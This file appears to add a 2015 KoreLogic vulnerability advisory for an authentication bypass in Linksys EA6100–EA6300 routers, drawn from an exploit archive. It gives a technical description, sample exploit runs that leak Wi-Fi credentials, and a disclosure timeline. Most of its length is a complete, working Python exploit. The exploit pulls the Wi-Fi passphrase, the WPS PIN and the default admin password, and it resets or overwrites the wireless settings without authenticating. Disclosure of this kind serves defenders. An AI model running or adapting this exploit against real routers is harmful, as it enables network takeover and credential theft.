@@ -1,0 +1,345 @@
+id: 24666
+date: 12/05/2015
+title: Linksys EA6100 Wireless Router Authentication Bypass Vulnerability
+author: Matthew Bergin
+cves: 
+
+
+Title: Linksys EA6100 Wireless Router Authentication Bypass
+Advisory ID: KL-001-2015-006
+Publication Date: 2015.12.04
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2015-006.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Linksys
+     Affected Product: EA6100 - EA6300  Wireless Router
+     Affected Version: 1.1.5
+     Platform: Embedded Linux
+     CWE Classification: CWE-288: Authentication Bypass Using an
+     Alternate Path or Channel
+     Impact: Remote Administration
+     Attack vector: HTTP
+     CVE-ID: <Not Yet Assigned>
+
+2. Vulnerability Description
+
+     Multiple CGI scripts in the web-based administrative
+     interface of the Linksys EA6100 - EA6300 Wireless Router
+     allow unauthenticated access to the high-level administrative
+     functions of the device. This vulnerability can be leveraged
+     by an unauthenticated attacker to obtain the router's
+     administrative password and subsequently arbitrarily configure
+     the device.
+
+
+3. Technical Description
+
+     root@wpad:/tmp/_FW_EA6100_1.1.5.162431_prod.img.extracted/test# ls
+     bin  dev  etc  home  JNAP  lib  libexec  linuxrc  mnt  opt  proc  root
+     sbin  sys  tmp  usr  var  www
+     root@wpad:/tmp/_FW_EA6100_1.1.5.162431_prod.img.extracted/test# cd www
+     root@wpad:/tmp/_FW_EA6100_1.1.5.162431_prod.img.extracted/test/www# ls
+     bootloader_info.cgi  dhcp_log.txt    get_counter_info.cgi
+     incoming_log.txt  JNAP         outgoing_log.txt  security_log.txt
+     sysinfo.cgi  usbinfo.cgi     cgi-bin              ezwifi_cfg.cgi
+     getstinfo.cgi         jcgi              license.pdf  qos_info.cgi
+     speedtest_info.cgi  ui
+     root@wpad:/tmp/_FW_EA6100_1.1.5.162431_prod.img.extracted/test/www# ls -la sysinfo.cgi
+     lrwxrwxrwx 1 root root 23 Jul 21  2014 sysinfo.cgi -> /www/ui/cgi/sysinfo.cgi
+     root@wpad:/tmp/_FW_EA6100_1.1.5.162431_prod.img.extracted/test/www# cat ui/cgi/sysinfo.cgi
+     #!/bin/sh
+
+     ########################################################
+     # sysinfo.sh ----> /www/sysinfo.cgi
+     #
+     # When adding new debug information into this script file
+     # do the following:
+     #    1)  create your debug script <your_debug_script.sh>
+     #    2)  call your debug script in this sysinfo.sh script
+     #        using the format:
+     #         if [ -f <your debug script> ]; then
+     #             ./<your debug script.cgi>
+     #         fi
+     ########################################################
+     ...
+     ...
+
+     Other CGI files that are accessible from an unauthenticated perspective
+     can be used to configure settings for the affected device. This led to
+     the development of an exploit to abuse these vulnerabilities.
+
+     level:Debug level$ ./linksys-ea6100-auth-bypass -h
+     Usage: ./linksys-ea6100-auth-bypass [params]
+
+     -h Help Menu
+     -i Target Address
+     -r Reset Attack
+     -g Get System Info
+     -p Get Wifi Password
+
+     Example: ./linksys-ea6100-auth-bypass -i 10.10.10.1 -r
+     Brought to you by Level at KoreLogic
+     level:Debug level$ ./linksys-ea6100-auth-bypass -i 172.17.100.200 -p
+     Getting wireless passphrase
+
+     SSID=840146d6919<redacted>
+     Passphrase=e0fc253e585bf33d7b<redacted>
+     level:Debug level$ ./linksys-ea6100-auth-bypass -i 172.17.100.200 -g|more
+     Brought to you by Level at KoreLogic
+     Getting system info
+
+     page generated on Tue Jan 20 20:01:48 UTC 2015
+
+     UpTime:
+      20:01:48 up 3 days, 16:24, load average: 0.00, 0.04, 0.05
+
+     Firmware Version: 1.1.5.159694
+     Firmware Builddate: 2014-03-21 03:09
+     Product.type: production
+     Linux: Linux version 2.6.36 (root@build-vm) (gcc version 4.2.3) #1 Thu Mar 20 19:40:45 PDT 2014
+     Board: focus
+     ...
+     ...
+
+4. Mitigation and Remediation Recommendation
+
+     No response from vendor; no remediation available.
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2015.09.10 - KoreLogic submits vulnerability details to
+                  security@linksys.com.
+     2015.10.05 - KoreLogic submits vulnerability details to
+                  security@linksys.com again.
+     2015.11.20 - KoreLogic requests CVE from MITRE.
+     2015.12.02 - KoreLogic requests CVE from MITRE.
+     2015.12.03 - KoreLogic requests CVE from MITRE.
+     2015.12.04 - KoreLogic requests CVE from MITRE.
+     2015.12.04 - Public disclosure.
+
+7. Proof of Concept
+
+     #!/usr/bin/env python3
+     ########################################################################
+     #
+     # Copyright 2015 KoreLogic Inc.,  All Rights Reserved.
+     #
+     # This proof of concept,  having been partly or wholly developed
+     # and/or sponsored by KoreLogic,  Inc.,  is hereby released under
+     # the terms and conditions set forth in the Creative Commons
+     # Attribution Share-Alike 4.0 (United States) License:
+     #
+     #   http://creativecommons.org/licenses/by-sa/4.0/
+     #
+     #######################################################################
+
+     from optparse import OptionParser
+     from urllib.request import urlopen, Request
+     from base64 import b64encode
+     from json import loads
+     from sys import exit
+
+
+     def reset_ap(host, passphrase):
+         """Resets the wireless security settings of the access point."""
+         try:
+             payload = '[{"action":"http://linksys.com/jnap/wirelessap/SetRadioSettings", "request":{"radios":[{"radioID":"RADIO_5GHz", "settings":{"isEnabled":true, "mode":"802.11mixed", "ssid":"korelogic", "broadcastSSID":true, "channelWidth":"Auto", "channel":0, "security":"WPA2-Personal", "wpaPersonalSettings":{"passphrase":"korelogic"}}}]}}]'
+             headers = {'X-JNAP-Action': 'http://linksys.com/jnap/core/Transaction', 'X-JNAP-Authorization': 'Basic {:s}'.format(str(b64encode(passphrase)))}
+             request = Request("https://{:s}/JNAP/".format(str(host)), payload.encode('ascii'), headers)
+             fd = urlopen(request)
+             data5 = loads(fd.read())['result']
+             fd.close()
+         except Exception as e:
+             print("[!] Could not reset the 5ghz access point security, reason: {0}.".format(str(e)))
+             return -1
+         try:
+             payload = '[{"action":"http://linksys.com/jnap/wirelessap/SetRadioSettings", "request":{"radios":[{"radioID":"RADIO_2GHz", "settings":{"isEnabled":true, "mode":"802.11mixed", "ssid":"korelogic2", "broadcastSSID":true, "channelWidth":"Auto", "channel":0, "security":"WPA2-Personal", "wpaPersonalSettings":{"passphrase":"korelogic2"}}}]}}]'
+             headers = {'X-JNAP-Action': 'http://linksys.com/jnap/core/Transaction', 'X-JNAP-Authorization': 'Basic {:s}'.format(str(b64encode(passphrase)))}
+             request = Request("https://{:s}/JNAP/".format(str(host)), payload.encode('ascii'), headers)
+             fd = urlopen(request)
+             data2 = loads(fd.read())['result']
+             fd.close()
+         except Exception as e:
+             print("[!] Could not reset the 2.4ghz access point security, reason: {0}".format(str(e)))
+             return -1
+         return data5, data2
+
+
+     def is_admin_default(host):
+         """Determines whether or not the administrator passphrase is default."""
+         try:
+             request = Request("https://{:s}/JNAP/".format(str(host)), "{}".encode('ascii'), {'X-JNAP-Action': 'http://linksys.com/jnap/core/IsAdminPasswordDefault'})
+             fd = urlopen(request)
+             data = loads(fd.read().decode('utf-8'))['output']['isAdminPasswordDefault']
+             fd.close()
+         except Exception as e:
+             print("[!] Could not determine if administrator passphrase is default, reason: {0}".format(str(e)))
+             return -1
+         return data
+
+
+     def is_host_alive(host):
+         """Does a basic HTTP test to determine access."""
+         try:
+             fd = urlopen("https://{:s}/".format(str(host)))
+             fd.close()
+         except Exception as e:
+             print("[!] Could not determine if target host was alive, reason: {:s}".format(str(e)))
+             return False
+         print("[+] Target host is alive, proceeding.")
+         return True
+
+
+     def run_payload(host, payload_url):
+         """Run a provided HTTP request."""
+         try:
+             target = "https://{:s}/{:s}".format(str(host), str(payload_url))
+             fd = urlopen(target)
+             data = fd.read()
+             fd.close()
+         except Exception as e:
+             print("[!] Unable to execute payload,  reason: {0}".format(str(e)))
+             return -1
+         return data.decode('utf-8')
+
+
+     def main():
+         """Handle options provided and execute appropriate payloads."""
+         payload_url, o, a = None, None, None
+         print("Brought to you by Level at KoreLogic\n")
+         parser = OptionParser()
+         parser.add_option("--host", dest="host", help="Target IP address")
+         parser.add_option("--sysinfo", action="store_true", help="Get target system information")
+         parser.add_option("--getpwhash", action="store_true", help="Get target wireless password hash")
+         parser.add_option("--getclearpw", action="store_true", help="Get target wireless SSID and cleartext password")
+         parser.add_option("--isdefault", action="store_true", help="Check if target is running the default admin credential (if yes, obtain passphrase)")
+         parser.add_option("--resetwifi", action="store_true", help="Reset the access point security (requires default passphrase)")
+         parser.add_option("--poisonwifi", action="store_true", help="Poison the access point security settings")
+         parser.add_option("--getwpspin", action="store_true", help="Get the WPS pin for the target")
+         o, a = parser.parse_args()
+         if o.host is None:
+             print("[!] You must specify a target host, please see --help")
+             exit(1)
+         else:
+             if is_host_alive(o.host) is not True:
+                 print("[!] Could not establish connection to target")
+                 exit(1)
+             else:
+                 if o.sysinfo is not None:
+                     print("[+] Obtaining system information -")
+                     payload_url = "sysinfo.cgi"
+                     response = run_payload(o.host, payload_url)
+                     if response is not -1:
+                         for line in response.split("\n"):
+                             print(line)
+                 if o.getpwhash is not None:
+                     print("[+] Obtaining wireless password hash -")
+                     payload_url = "getstinfo.cgi"
+                     response = run_payload(o.host, payload_url)
+                     if response is not -1:
+                         for line in response.split("\n"):
+                             print("\t{0}".format(str(line)))
+                 if o.getclearpw is not None:
+                     print("[+] Obtaining wireless ssid and password -")
+                     payload_url = "sysinfo.cgi"
+                     response = run_payload(o.host, payload_url)
+                     if response is not -1:
+                         for line in response.split("\n"):
+                             if "wl0_ssid=" in line:
+                                 print("\twl0 SSID: {0}".format(str(line.split("=")[1])))
+                             if "wl1_ssid=" in line:
+                                 print("\twl1 SSID: {0}".format(str(line.split("=")[1])))
+                             if "wl0_passphrase=" in line:
+                                 print("\twl0 Passphrase: {0}".format(str(line.split("=")[1])))
+                             if "wl1_passphrase=" in line:
+                                 print("\twl1 Passphrase: {0}".format(str(line.split("=")[1])))
+                 if o.isdefault is not None:
+                     print("[+] Checking if administrator passphrase is default -")
+                     payload_url = "sysinfo.cgi"
+                     response = is_admin_default(o.host)
+                     if response is True:
+                         print("[+] Passphrase is default, asking for the password -")
+                         payload_url = "sysinfo.cgi"
+                         response = run_payload(o.host, payload_url)
+                         if response is not -1:
+                             for line in response.split("\n"):
+                                 if "device::default_passphrase=" in line:
+                                     print("\tDefault passphrase: {0}".format(str(line.split("=")[1])))
+                     else:
+                         print("[!] Passphrase is not default")
+                 if o.getwpspin is not None:
+                     print("[+] Getting WPS pin -")
+                     payload_url = "sysinfo.cgi"
+                     response = run_payload(o.host, payload_url)
+                     if response is not -1:
+                         for line in response.split("\n"):
+                             if "device::wps_pin=" in line:
+                                 print("\tWPS PIN: {0}".format(str(line.split("=")[1])))
+                 if o.resetwifi is not None:
+                     print("[+] Resetting the access point security -")
+                     payload_url = "sysinfo.cgi"
+                     response = is_admin_default(o.host)
+                     if response is True:
+                         print("[+] Admin password is default, asking for the password")
+                         response = run_payload(o.host, payload_url)
+                         if response is not -1:
+                             for line in response.split("\n"):
+                                 if "device::default_passphrase=" in line:
+                                     passphrase = line.split("=")[1]
+                                     print("[+] Got the passphrase: {0}".format(str(passphrase)))
+                                     data5, data2 = reset_ap(o.host, passphrase)
+                                     if data5 is 'OK' and data2 is 'OK':
+                                         print("[+] AP will now restart with the SSID and passphrase: korelogic/korelogic and korelogic2/korelogic2")
+                     else:
+                         print("[!] Admin password is not default.")
+                 if o.poisonwifi is not None:
+                     print("[+] Poisoning wireless ssid configuration")
+                     payload_url = "ezwifi_cfg.cgi?CMD=configure&2ssid=korelogic&2passphrase=korelogic&2mode=11b&5ssid=korelogic2&5passphrase=korelogic2&5mode=11a"
+                     response = run_payload(o.host, payload_url)
+                     if response is not -1:
+                         payload_url = "sysinfo.cgi"
+                         response = run_payload(o.host, payload_url)
+                         if response is not -1:
+                             ap_poisoned = None
+                             for line in response.split("\n"):
+                                 if "wl0_ssid=" in line or "wl1_ssid=" in line:
+                                     if "korelogic" in line:
+                                         print("[+] Access point ssid settings poisoned. An administrator will need to hit Apply anywhere in the UI")
+                                         ap_poisoned = 1
+                             if ap_poisoned is None:
+                                 print("[!] Access point ssid settings could not be poisoned, consider running --getclearpw")
+                 if payload_url is None:
+                     print("[!] No attack has been specified, please see --help")
+                     exit(1)
+         return exit(0)
+
+     if __name__ == "__main__":
+         main()
+
+
+The contents of this advisory are copyright(c) 2015
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
+
+
+#  0day.today [2023-03-25]  #
